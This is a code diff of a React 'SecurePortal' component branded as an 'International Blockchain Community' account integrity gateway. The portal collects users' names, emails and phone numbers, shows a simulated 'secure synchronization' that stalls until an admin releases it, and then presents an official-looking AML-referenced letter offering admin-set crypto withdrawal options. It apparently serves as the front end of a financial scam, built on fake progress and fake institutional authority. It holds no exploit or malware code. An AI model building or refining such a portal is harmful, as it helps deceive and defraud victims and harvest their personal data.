@@ -3,20 +3,11 @@ import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
-import { Progress } from "@/components/ui/progress";
-import { ShieldCheck, Lock, ArrowRight, CheckCircle2, AlertCircle, Globe, FileText, Activity, Key, Loader2, User, Mail, Phone } from "lucide-react";
-import { motion, AnimatePresence } from "framer-motion";
+import { Badge } from "@/components/ui/badge";
+import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft } from "lucide-react";
+import { motion } from "framer-motion";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
-
-// Types shared with Admin (ideally in a shared file)
-interface AdminData {
-  vipStatus: string;
-  username: string;
-  withdrawalAmount: string;
-  withdrawalBatches: string;
-  physilocal0: string;
-}
 
 interface Case {
   id: string;
@@ -32,33 +23,81 @@ interface Case {
   physilocal0?: string;
 }
 
+interface CaseLetter {
+  headline?: string;
+  introduction?: string;
+  bodyContent?: string;
+  footerNote?: string;
+  optionATitle?: string;
+  optionADescription?: string;
+  optionBTitle?: string;
+  optionBDescription?: string;
+}
+
+interface Submission {
+  id: number;
+  caseId: string;
+  selectedOption: string;
+  notes?: string;
+  userName?: string;
+  userEmail?: string;
+  withdrawalAmount?: string;
+  withdrawalBatches?: string;
+  submittedAt: string;
+}
+
 export default function SecurePortal() {
-  // Flow State: 'login' -> 'register' -> 'sync' -> 'letter' -> 'success'
-  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'letter' | 'success'>('login');
+  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'letter' | 'submissions' | 'success'>('login');
   
-  // Data State
   const [currentCase, setCurrentCase] = useState<Case | null>(null);
+  const [letterContent, setLetterContent] = useState<CaseLetter | null>(null);
+  const [submissions, setSubmissions] = useState<Submission[]>([]);
   const [accessCode, setAccessCode] = useState("");
   
-  // Registration Form
   const [regName, setRegName] = useState("");
   const [regEmail, setRegEmail] = useState("");
   const [regMobile, setRegMobile] = useState("");
   
-  // Sync State
   const [syncProgress, setSyncProgress] = useState(0);
   const [syncStatusText, setSyncStatusText] = useState("Initializing secure handshake...");
   
-  // Letter Form State
   const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
   const [isConfirming, setIsConfirming] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   
   const { toast } = useToast();
 
-  // ------------------------------------------------------------------
-  // POLLING EFFECT (For Sync Phase)
-  // ------------------------------------------------------------------
+  // Load letter content and submissions when case becomes active
+  useEffect(() => {
+    if (currentCase && (viewState === 'letter' || viewState === 'submissions')) {
+      loadLetterAndSubmissions();
+    }
+  }, [currentCase, viewState]);
+
+  const loadLetterAndSubmissions = async () => {
+    if (!currentCase) return;
+    
+    try {
+      const [letterRes, submissionsRes] = await Promise.all([
+        fetch(`/api/cases/${currentCase.id}/letter`),
+        fetch(`/api/cases/${currentCase.id}/submissions`)
+      ]);
+      
+      if (letterRes.ok) {
+        const data = await letterRes.json();
+        setLetterContent(data);
+      }
+      
+      if (submissionsRes.ok) {
+        const data = await submissionsRes.json();
+        setSubmissions(data);
+      }
+    } catch (error) {
+      console.error('Failed to load data:', error);
+    }
+  };
+
+  // Polling for sync status
   useEffect(() => {
     if (viewState !== 'sync' || !currentCase) return;
 
@@ -70,7 +109,6 @@ export default function SecurePortal() {
           
           if (updatedCase.status === 'active') {
             setCurrentCase(updatedCase);
-            // Wait a moment to show 100% before transitioning
             setSyncProgress(100);
             setSyncStatusText("Synchronization Complete.");
             setTimeout(() => setViewState('letter'), 1000);
@@ -84,10 +122,6 @@ export default function SecurePortal() {
     return () => clearInterval(interval);
   }, [viewState, currentCase]);
 
-  // ------------------------------------------------------------------
-  // HANDLERS
-  // ------------------------------------------------------------------
-
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -96,26 +130,18 @@ export default function SecurePortal() {
       
       if (response.ok) {
         const foundCase = await response.json();
+        setCurrentCase(foundCase);
         
-        if (foundCase.status !== 'completed') {
-          setCurrentCase(foundCase);
-          // If already registered, go to sync or letter
-          if (foundCase.status === 'active') setViewState('letter');
-          else if (foundCase.status === 'syncing') setViewState('sync');
-          else setViewState('register');
-          
-          toast({
-            title: "Identity Verified",
-            description: "Secure session established.",
-            className: "bg-green-50 border-green-200 text-green-900",
-          });
-        } else {
-          toast({
-            variant: "destructive",
-            title: "Access Denied",
-            description: "This case has been completed.",
-          });
-        }
+        if (foundCase.status === 'active') setViewState('letter');
+        else if (foundCase.status === 'syncing') setViewState('sync');
+        else if (foundCase.status === 'completed') setViewState('submissions');
+        else setViewState('register');
+        
+        toast({
+          title: "Identity Verified",
+          description: "Secure session established.",
+          className: "bg-green-50 border-green-200 text-green-900",
+        });
       } else {
         toast({
           variant: "destructive",
@@ -170,7 +196,6 @@ export default function SecurePortal() {
   };
 
   const startSyncSimulation = () => {
-    // Simulate progress steps up to 90%, then wait for admin
     let progress = 0;
     const interval = setInterval(() => {
       progress += 5;
@@ -195,13 +220,11 @@ export default function SecurePortal() {
 
     if (currentCase && selectedOption) {
       try {
-        const response = await fetch(`/api/cases/${currentCase.id}`, {
-          method: 'PATCH',
+        const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
+          method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            status: 'completed',
-            selectedOption: selectedOption,
-            submittedAt: new Date().toISOString()
+            selectedOption: selectedOption
           })
         });
 
@@ -228,16 +251,13 @@ export default function SecurePortal() {
     }
   };
 
-  // ------------------------------------------------------------------
-  // VIEWS
-  // ------------------------------------------------------------------
-
+  // LOGIN VIEW
   if (viewState === 'login') {
     return (
       <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
         <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
           <div className="text-center mb-8">
-            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" />
+            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" data-testid="img-logo" />
             <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
             <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
           </div>
@@ -259,10 +279,11 @@ export default function SecurePortal() {
                       className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500"
                       value={accessCode}
                       onChange={(e) => setAccessCode(e.target.value)}
+                      data-testid="input-access-code"
                     />
                   </div>
                 </div>
-                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white">Verify Identity</Button>
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-login">Verify Identity</Button>
               </form>
             </CardContent>
             <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
@@ -276,6 +297,7 @@ export default function SecurePortal() {
     );
   }
 
+  // REGISTER VIEW
   if (viewState === 'register') {
     return (
       <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
@@ -291,24 +313,24 @@ export default function SecurePortal() {
                   <label className="text-xs font-medium text-slate-400 uppercase">Full Legal Name</label>
                   <div className="relative">
                     <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
-                    <Input required value={regName} onChange={e => setRegName(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="e.g. Luzmila Chavez" />
+                    <Input required value={regName} onChange={e => setRegName(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="e.g. Luzmila Chavez" data-testid="input-name" />
                   </div>
                 </div>
                 <div className="space-y-2">
                   <label className="text-xs font-medium text-slate-400 uppercase">Email Address</label>
                   <div className="relative">
                     <Mail className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
-                    <Input required type="email" value={regEmail} onChange={e => setRegEmail(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="name@example.com" />
+                    <Input required type="email" value={regEmail} onChange={e => setRegEmail(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="name@example.com" data-testid="input-email" />
                   </div>
                 </div>
                 <div className="space-y-2">
                   <label className="text-xs font-medium text-slate-400 uppercase">Mobile Number</label>
                   <div className="relative">
                     <Phone className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
-                    <Input required type="tel" value={regMobile} onChange={e => setRegMobile(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="+1 (555) 000-0000" />
+                    <Input required type="tel" value={regMobile} onChange={e => setRegMobile(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="+1 (555) 000-0000" data-testid="input-mobile" />
                   </div>
                 </div>
-                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4">
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4" data-testid="button-register">
                   Proceed to Secure Synchronization
                 </Button>
               </form>
@@ -319,6 +341,7 @@ export default function SecurePortal() {
     );
   }
 
+  // SYNC VIEW
   if (viewState === 'sync') {
     return (
       <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
@@ -356,6 +379,7 @@ export default function SecurePortal() {
     );
   }
 
+  // SUCCESS VIEW
   if (viewState === 'success') {
     return (
       <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
@@ -368,16 +392,82 @@ export default function SecurePortal() {
             <p className="text-slate-600 mb-6">
               Your request has been securely transmitted to the International Blockchain Community (IBC) admin panel.
             </p>
-            <Button onClick={() => window.location.reload()} variant="outline" className="w-full">Return to Dashboard</Button>
+            <Button onClick={() => window.location.reload()} variant="outline" className="w-full" data-testid="button-return">Return to Dashboard</Button>
           </div>
         </motion.div>
       </div>
     );
   }
 
-  // ------------------------------------------------------------------
-  // LETTER VIEW (Using Admin Data)
-  // ------------------------------------------------------------------
+  // SUBMISSIONS FOLDER VIEW
+  if (viewState === 'submissions') {
+    return (
+      <div className="min-h-screen bg-slate-900 p-4 font-sans">
+        <div className="max-w-3xl mx-auto">
+          <div className="flex items-center gap-3 mb-8">
+            <img src={ibcLogo} alt="IBC Logo" className="h-10 w-10 object-contain opacity-80" />
+            <div>
+              <h1 className="text-xl font-bold text-white">Document Archive</h1>
+              <p className="text-slate-400 text-xs">Your submission history</p>
+            </div>
+          </div>
+
+          <Card className="bg-slate-950 border-slate-800 mb-6">
+            <CardHeader className="border-b border-slate-800">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <FolderOpen className="w-5 h-5 text-blue-500" />
+                  <CardTitle className="text-white text-lg">Your Submissions</CardTitle>
+                </div>
+                <Badge variant="outline" className="text-slate-400 border-slate-700">
+                  {submissions.length} records
+                </Badge>
+              </div>
+            </CardHeader>
+            <CardContent className="pt-6">
+              {submissions.length === 0 ? (
+                <div className="text-center py-12 text-slate-500">
+                  <FileText className="w-12 h-12 mx-auto mb-4 opacity-50" />
+                  <p>No submissions found.</p>
+                </div>
+              ) : (
+                <div className="space-y-4">
+                  {submissions.map((s) => (
+                    <div key={s.id} className="bg-slate-900 border border-slate-800 rounded-lg p-4" data-testid={`submission-${s.id}`}>
+                      <div className="flex justify-between items-start mb-3">
+                        <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
+                          Option {s.selectedOption} Selected
+                        </Badge>
+                        <span className="text-xs text-slate-500">
+                          {new Date(s.submittedAt).toLocaleString()}
+                        </span>
+                      </div>
+                      <div className="grid grid-cols-2 gap-4 text-sm">
+                        <div>
+                          <span className="text-slate-500 block text-xs mb-1">Withdrawal Amount</span>
+                          <span className="text-green-400 font-medium">{s.withdrawalAmount}</span>
+                        </div>
+                        <div>
+                          <span className="text-slate-500 block text-xs mb-1">Total Batches</span>
+                          <span className="text-slate-300">{s.withdrawalBatches}</span>
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </CardContent>
+          </Card>
+
+          <Button variant="outline" className="border-slate-700 text-slate-300" onClick={() => window.location.reload()} data-testid="button-logout">
+            <ArrowLeft className="w-4 h-4 mr-2" /> Logout
+          </Button>
+        </div>
+      </div>
+    );
+  }
+
+  // LETTER VIEW
   const adminData = currentCase ? {
     vipStatus: currentCase.vipStatus,
     username: currentCase.username,
@@ -386,9 +476,20 @@ export default function SecurePortal() {
     physilocal0: currentCase.physilocal0
   } : undefined;
 
+  const letter = letterContent || {
+    headline: "Withdrawal Protocol Selection",
+    introduction: `Dear ${currentCase?.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
+    bodyContent: `In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account ${adminData?.username}.`,
+    footerNote: "NEXT ACTION REQUIRED: Please confirm your preferred withdrawal option below.",
+    optionATitle: "Accelerated Release",
+    optionADescription: "Full withdrawal amount processed in accelerated batches.",
+    optionBTitle: "Standard Release",
+    optionBDescription: "Half allocation processed in standard batches."
+  };
+
   return (
     <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
-      {/* Top Navigation Bar */}
+      {/* Navigation */}
       <nav className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex justify-between h-16">
@@ -400,6 +501,17 @@ export default function SecurePortal() {
               </div>
             </div>
             <div className="flex items-center gap-4">
+              {submissions.length > 0 && (
+                <Button 
+                  variant="outline" 
+                  size="sm" 
+                  className="border-slate-300"
+                  onClick={() => setViewState('submissions')}
+                  data-testid="button-view-history"
+                >
+                  <History className="w-4 h-4 mr-2" /> View History ({submissions.length})
+                </Button>
+              )}
               <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium border border-green-100">
                 <ShieldCheck className="w-3 h-3" />
                 <span>Verified: {adminData?.vipStatus || "Standard"}</span>
@@ -415,18 +527,18 @@ export default function SecurePortal() {
 
       <main className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
         <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
-          {/* Header Section */}
+          {/* Header */}
           <div className="mb-10 text-center md:text-left">
             <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wide mb-4 border border-blue-100">
               <Lock className="w-3 h-3" /> Action Required
             </div>
             <h1 className="text-3xl md:text-4xl font-serif font-bold text-slate-900 mb-2">
-              Withdrawal Protocol Selection
+              {letter.headline}
             </h1>
-            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-774982 • Physilocal0: {adminData?.physilocal0}</p>
+            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-{currentCase?.accessCode} • Physilocal0: {adminData?.physilocal0}</p>
           </div>
 
-          {/* Full Letter Content */}
+          {/* Letter Content */}
           <div className="bg-white rounded-lg border border-slate-200 p-8 md:p-10 shadow-sm mb-10 relative overflow-hidden">
             <div className="absolute top-[-20%] right-[-10%] w-[50%] h-[150%] opacity-[0.03] pointer-events-none">
               <img src={ibcLogo} alt="" className="w-full h-full object-contain" />
@@ -439,17 +551,20 @@ export default function SecurePortal() {
               </div>
               <div className="prose prose-slate text-slate-700 max-w-none text-sm leading-relaxed">
                 <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.userName || "Client"},</p>
-                <p className="mb-4">
-                  We acknowledge the successful completion of your re-authentication procedure. In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account <strong>{adminData?.username}</strong>.
-                </p>
-                <p className="mb-4">
-                  <strong>NEXT ACTION REQUIRED:</strong> Please confirm your preferred withdrawal option below.
-                </p>
+                {letter.introduction && (
+                  <p className="mb-4 whitespace-pre-line">{letter.introduction}</p>
+                )}
+                {letter.bodyContent && (
+                  <p className="mb-4 whitespace-pre-line">{letter.bodyContent}</p>
+                )}
+                {letter.footerNote && (
+                  <p className="mb-4"><strong>{letter.footerNote}</strong></p>
+                )}
               </div>
             </div>
           </div>
 
-          {/* Dynamic Options Grid based on Admin Data */}
+          {/* Options */}
           <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
             <div className="w-8 h-[1px] bg-slate-300"></div>
             Select Withdrawal Option
@@ -459,17 +574,20 @@ export default function SecurePortal() {
           <div className="grid md:grid-cols-2 gap-8 mb-12">
             {/* Option A */}
             <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
-              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')}>
+              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')} data-testid="card-option-a">
                 <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                   <div className="flex justify-between items-start">
                     <div>
                       <div className="text-xs font-bold text-primary uppercase tracking-wider mb-1">Option A – Accelerated</div>
-                      <CardTitle className="text-2xl font-bold text-slate-900">Accelerated Release</CardTitle>
+                      <CardTitle className="text-2xl font-bold text-slate-900">{letter.optionATitle}</CardTitle>
                     </div>
                     <div className="h-10 w-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">A</div>
                   </div>
                 </CardHeader>
                 <CardContent className="pt-6 space-y-4">
+                  {letter.optionADescription && (
+                    <p className="text-sm text-slate-600">{letter.optionADescription}</p>
+                  )}
                   <div className="flex justify-between items-baseline">
                     <span className="text-2xl font-bold text-primary">{adminData?.withdrawalAmount}</span>
                   </div>
@@ -485,24 +603,27 @@ export default function SecurePortal() {
                   </div>
                 </CardContent>
                 <CardFooter className="pt-2 pb-6">
-                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'}>Select Option A</Button>
+                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'} data-testid="button-select-a">Select Option A</Button>
                 </CardFooter>
               </Card>
             </motion.div>
 
-             {/* Option B (Derived/Static for demo) */}
-             <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
-              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`} onClick={() => handleSelect('B')}>
+            {/* Option B */}
+            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
+              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`} onClick={() => handleSelect('B')} data-testid="card-option-b">
                 <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                   <div className="flex justify-between items-start">
                     <div>
                       <div className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Option B – Standard</div>
-                      <CardTitle className="text-2xl font-bold text-slate-900">Standard Release</CardTitle>
+                      <CardTitle className="text-2xl font-bold text-slate-900">{letter.optionBTitle}</CardTitle>
                     </div>
                     <div className="h-10 w-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 font-bold">B</div>
                   </div>
                 </CardHeader>
                 <CardContent className="pt-6 space-y-4">
+                  {letter.optionBDescription && (
+                    <p className="text-sm text-slate-600">{letter.optionBDescription}</p>
+                  )}
                   <div className="flex justify-between items-baseline">
                     <span className="text-2xl font-bold text-slate-700">Half Allocation</span>
                   </div>
@@ -518,31 +639,43 @@ export default function SecurePortal() {
                   </div>
                 </CardContent>
                 <CardFooter className="pt-2 pb-6">
-                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'}>Select Option B</Button>
+                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'} data-testid="button-select-b">Select Option B</Button>
                 </CardFooter>
               </Card>
             </motion.div>
           </div>
-
-          {/* Confirmation Modal */}
-          <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
-            <DialogContent className="sm:max-w-md">
-              <DialogHeader>
-                <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
-                <DialogDescription>
-                  You are about to initiate the withdrawal schedule for {adminData?.username}.
-                </DialogDescription>
-              </DialogHeader>
-              <DialogFooter>
-                <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
-                <Button onClick={handleSubmit} disabled={isSubmitting} className="w-full sm:w-auto gap-2">
-                  {isSubmitting ? "Transmitting..." : "Submit Selection"}
-                </Button>
-              </DialogFooter>
-            </DialogContent>
-          </Dialog>
         </motion.div>
       </main>
+
+      {/* Confirmation Dialog */}
+      <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
+            <DialogDescription>
+              You are about to initiate the withdrawal schedule for {adminData?.username}.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="py-4">
+            <div className="bg-slate-50 rounded-lg p-4 space-y-2">
+              <div className="flex justify-between">
+                <span className="text-slate-500">Selected Option</span>
+                <Badge className={selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>Option {selectedOption}</Badge>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-500">Amount</span>
+                <span className="font-medium">{adminData?.withdrawalAmount}</span>
+              </div>
+            </div>
+          </div>
+          <DialogFooter>
+            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
+            <Button onClick={handleSubmit} disabled={isSubmitting} className="gap-2" data-testid="button-confirm-submit">
+              {isSubmitting ? "Transmitting..." : "Submit Selection"}
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
